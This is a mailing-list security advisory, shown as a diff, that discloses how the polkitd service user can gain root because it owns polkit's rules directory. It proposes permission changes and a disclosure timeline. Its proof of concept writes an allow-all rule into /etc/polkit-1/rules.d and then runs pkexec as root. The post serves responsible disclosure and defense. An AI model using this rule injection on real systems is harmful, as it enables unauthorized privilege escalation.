@@ -1,0 +1,101 @@
+
+Date: Wed, 29 Mar 2023 15:34:50 +0200
+From: Johannes Segitz <jsegitz@...e.de>
+To: oss-security@...ts.openwall.com
+Subject: polkitd service user privilege separation
+
+Hello,
+
+I'm a member of the SUSE product security team. During the product audit
+for SLES 15 SP5 I noticed an issue with polkit:
+
+# Default rules config writeable for the service user
+
+polkit stores rules in /etc/polkit-1/rules.d. We follow the upstream
+provided permissions for this folder, so polkitd owns it and permissions
+are set to 700:
+
+localhost:/etc/polkit-1/rules.d # ls -lah
+total 64K
+drwx------ 1 polkitd root  44 Mar  8 18:29 .
+drwxr-xr-x 1 root    root  14 Mar  8 17:16 ..
+-rw-r--r-- 1 root    root 64K Mar  8 17:18 90-default-privs.rules
+
+Since the user owns the directory it's easy to escalate from user polkitd
+to root. The user can create own rules that are interpreted by the polkit
+authority which in turn grants root privileges via e.g. the setuid-root
+binary pkexec.
+
+# POC
+
+To show the impact of this get access to a shell running as polkitd. The
+easiest way is to spawn a root shell, then change into the polkitd user:
+
+root $ sudo -u polkitd /bin/sh
+polkitd $ id
+uid=475(polkitd) gid=475(polkitd) groups=475(polkitd)
+polkitd $ pkexec id
+==== AUTHENTICATING FOR org.freedesktop.policykit.exec ====
+Authentication is needed to run `/usr/bin/id' as the super user
+Authenticating as: root
+Password:
+
+So with the default rules the root password would be required. Since the
+rules directory is writeable we can add a rule that allows everything:
+
+polkitd $ echo 'polkit.addRule(function(action, subject) { return "yes"; });' > /etc/polkit-1/rules.d/00-allow-all.rules
+polkitd $ pkexec id
+uid=0(root) gid=0(root) groups=0(root)
+
+This demonstration caused some confusion in the original report to
+upstream. The POC is here to demonstrate the issue, not how real world
+exploitation would work. A real world exploit would rely on another
+vulnerability to be able to act as polkitd and then use the issue outlined
+here to escalate privileges.
+
+# Proposed solution
+
+If you can act as the polkitd user you can also likely influence the polkit
+daemon and gain root this way, so this just makes it (a lot) easier to exploit.
+I still think it's worthwhile to keep the user for the daemon and not run it as
+root.
+
+For existing installations change the permissions of
+- /etc/polkit-1/rules.d
+- /usr/share/polkit-1/rules.d
+to root:polkitd, 750 to make it harder to gain root privileges.
+
+SELinux or other more fine-grained control could be used to make escalating
+to root harder, by restricting the amount of freedom polkitd has. But in
+the end it's probably not possible to fully prevent this.
+
+Currently the documentation raises the expectation that there's a security
+boundary (man polkit):
+The polkit authority is implemented as an system daemon, polkitd(8), which
+itself has little privilege as it is running as the polkitd system user.
+
+Through this posting I wanted to raise awareness that the polkitd user in a
+default installation is equivalent to root without any further counter
+measures. In my opinion this should be stated in the man pages so that
+users are aware of this. At the moment most people would likely assume that
+the user serves a similar roles as other service users.
+
+# Communication with upstream
+
+- 2023-03-09: Informed upstream via confidential ticket:
+  https://gitlab.freedesktop.org/polkit/polkit/-/issues/191
+- 2023-03-15: Proposed documentation fix, not merged
+  https://gitlab.freedesktop.org/polkit/polkit/-/issues/191#note_1824052
+- 2023-03-21: Partial fix for the permission in
+  https://gitlab.freedesktop.org/polkit/polkit/-/merge_requests/153
+- 2023-03-29: Issue is public
+
+Johannes
+-- 
+GPG Key                EE16 6BCE AD56 E034 BFB3  3ADD 7BF7 29D5 E7C8 1FA0
+Subkey fingerprint:    250F 43F5 F7CE 6F1E 9C59  4F95 BC27 DD9D 2CC4 FD66
+SUSE Software Solutions Germany GmbH, Frankenstraße 146, 90461 Nürnberg, Germany
+Geschäftsführer: Ivo Totev, Andrew Myers, Andrew McDonald, Boudien Moerman
+(HRB 36809, AG Nürnberg)
+
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
